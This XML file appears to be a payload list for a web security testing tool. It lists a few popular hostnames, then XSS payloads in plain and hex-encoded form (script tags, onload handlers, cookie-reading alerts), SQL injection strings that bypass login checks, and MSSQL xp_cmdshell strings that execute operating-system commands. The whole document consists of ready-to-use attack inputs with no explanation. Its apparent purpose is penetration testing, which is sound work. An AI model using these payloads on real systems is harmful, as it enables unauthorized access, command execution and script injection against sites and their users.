<?xml version="1.0" encoding="ISO-8859-1"?>
<auto>
	<list>
		<listName>Hostnames</listName>
		<listItems>
			<code>www.yahoo.com</code>
			<code>www.digg.com</code>
			<code>www.cnn.com</code>
			<code>www.ebay.com</code>
			<code>www.myspace.com</code>
		</listItems>
	</list>
	<list>
		<listName>XSS Attacks</listName>
		<listItems>
			<code>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//&gt;&lt;/SCRIPT&gt;!--&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</code>
			<code>&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;</code>
			<code>&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code>
			<code>&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</code>
			<code>&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</code>
			<code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</code>
			<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code>
			<code>&lt;SCRIPT&gt;a=/XSS/
alert(a.source)&lt;/SCRIPT&gt;</code>
			<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
			<code>&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
		</listItems>
	</list>
	<list>
		<listName>XSS Attacks (hex)</listName>
		<listItems>
			<code>%27%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%5c%27%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%22%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%5c%22%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%3e%3c%2f%53%43%52%49%50%54%3e%21%2d%2d%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%53%43%52%49%50%54%3e%3d%26%7b%7d</code>
			<code>%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%27%58%53%53%27%29%3c%2f%53%43%52%49%50%54%3e</code>
			<code>%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%53%43%52%49%50%54%3e</code>
			<code>%3c%42%4f%44%59%20%4f%4e%4c%4f%41%44%3d%61%6c%65%72%74%28%27%58%53%53%27%29%3e</code>
			<code>%3c%49%46%52%41%4d%45%20%53%52%43%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%27%58%53%53%27%29%3b%22%3e%3c%2f%49%46%52%41%4d%45%3e</code>
			<code>%3c%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3b%2f%2f%3c%3c%2f%53%43%52%49%50%54%3e</code>
			<code>%3c%49%4d%47%20%22%22%22%3e%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3c%2f%53%43%52%49%50%54%3e%22%3e</code>
			<code>%3c%53%43%52%49%50%54%3e%61%3d%2f%58%53%53%2f%0a%61%6c%65%72%74%28%61%2e%73%6f%75%72%63%65%29%3c%2f%53%43%52%49%50%54%3e</code>
			<code>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e</code>
			<code>%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e</code>
		</listItems>
	</list>
	<list>
		<listName>Injection Attacks</listName>
		<listItems>
			<code>&apos;</code>
			<code>0 or 1=1</code>
			<code>0 or 1=1--</code>
			<code>&apos; or 1=1--</code>
			<code>&apos; or &apos;1&apos;=&apos;1&apos;--</code>
			<code>&apos; or &apos;&apos;=&apos;</code>
			<code>&apos; or &apos;x&apos;=&apos;x</code>
			<code>&apos; or &apos;x&apos;=&apos;x&apos;;</code>
			<code>&apos; or &apos;x&apos;=&apos;x&apos;--</code>
			<code>&apos;) or (&apos;x&apos;=&apos;x</code>
			<code>&apos; or 1=1 or &apos;&apos;=&apos;</code>
			<code>x&apos; or 1=1 or &apos;x&apos;=&apos;y</code>
			<code>&apos; or username like &apos;%</code>
			<code>&apos;; exec master..xp_cmdshell</code>
			<code>&apos;; exec master..xp_cmdshell &apos;nslookup www.google.com&apos;--</code>
		</listItems>
	</list>
	<list>
		<listName>Injection Attacks (url)</listName>
		<listItems>
			<code>&apos;</code>
			<code>0%20or%201=1</code>
			<code>0%20or%201=1--</code>
			<code>&apos;%20or%201=1--</code>
			<code>&apos;%20or%20&apos;1&apos;=&apos;1&apos;--</code>
			<code>&apos;%20or%20&apos;&apos;=&apos;</code>
			<code>&apos;%20or%20&apos;x&apos;=&apos;x</code>
			<code>&apos;%20or%20&apos;x&apos;=&apos;x&apos;;</code>
			<code>&apos;%20or%20&apos;x&apos;=&apos;x&apos;--</code>
			<code>&apos;)%20or%20(&apos;x&apos;=&apos;x</code>
			<code>&apos;%20or%201=1%20or%20&apos;&apos;=&apos;</code>
			<code>x&apos;%20or%201=1%20or%20&apos;x&apos;=&apos;y</code>
			<code>&apos;%20or%20username%20like%20&apos;%25</code>
			<code>&apos;;%20exec%20master..xp_cmdshell</code>
			<code>&apos;;%20exec%20master..xp_cmdshell%20&apos;nslookup%20www.google.com&apos;--</code>
		</listItems>
	</list>
</auto>
